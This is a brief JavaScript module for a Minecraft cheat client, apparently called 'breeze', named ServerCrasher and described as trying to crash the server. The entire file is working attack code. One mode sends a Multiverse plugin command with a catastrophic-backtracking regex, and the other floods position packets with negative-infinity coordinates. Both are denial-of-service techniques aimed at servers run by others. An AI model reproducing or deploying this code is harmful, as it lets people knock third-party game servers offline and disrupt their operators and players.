/*
name: ServerCrasher
author: Shoffli
*/

breeze.registerModule('ServerCrasher', 'Tries to crash the server.', {
    mode: new ModeSetting('Mode', 'The mode to use.', 'Position', ['Position', 'Multiverse']),

    enable: function () {
        if (this.mode.is('Multiverse')) {
            breeze.sendPacket(new C01PacketChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"), false);
            breeze.getModule("ServerCrasher").disable();
        }
    },

    motion: function(event) {
        if (this.mode.is('Position')) {
            breeze.sendPacket(new C04PacketPlayerPosition(Number.NEGATIVE_INFINITY, Number.NEGATIVE_INFINITY, Number.NEGATIVE_INFINITY, true), false);
        }
    }
});